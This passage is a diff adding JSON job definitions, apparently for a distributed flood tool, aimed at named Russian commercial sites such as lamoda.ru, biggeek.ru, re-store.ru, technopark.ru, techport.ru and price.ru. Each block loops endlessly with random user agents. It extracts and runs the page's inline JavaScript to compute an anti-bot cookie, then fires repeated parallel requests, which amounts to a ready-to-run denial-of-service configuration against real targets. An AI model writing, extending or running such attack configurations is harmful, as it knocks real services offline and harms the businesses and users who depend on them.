+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://www.lamoda.ru/men-home/?sitelink=topmenuM",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://job.lamoda.ru/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://job.lamoda.ru/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://gatemgmt.lamoda.ru/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://gatemgmt.lamoda.ru/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://biggeek.ru/catalog/apple-iphone-13-pro-max",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://biggeek.ru/catalog/apple-iphone-13-pro-max",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://re-store.ru/apple-iphone/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://re-store.ru/apple-iphone/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://www.technopark.ru/krupnaya-bytovaya-tehnika/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://www.technopark.ru/krupnaya-bytovaya-tehnika/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://www.techport.ru/katalog/products/otdelnostojaschaja-bytovaja-tehnika",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://www.techport.ru/katalog/products/otdelnostojaschaja-bytovaja-tehnika",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://price.ru/bytovaya-tehnika/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://price.ru/bytovaya-tehnika/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }, {
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
+          "args": {
+            "job": {
+              "type": "timeout",
+              "args": {
+                "timeout": "1h",
+                "job": {
+                  "type": "sequence",
+                  "args": {
+                    "jobs": [{
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      }, {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://biz.price.ru/welcome",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
+                            }
+                          }
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      }, {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      }, {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      }, {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [{
+                              "type": "http",
+                              "count": 3,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://biz.price.ru/welcome",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
+                                }
+                              }
+                            }
+                          ]
+                        }
+                      }
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        }
       }
     }
   ]
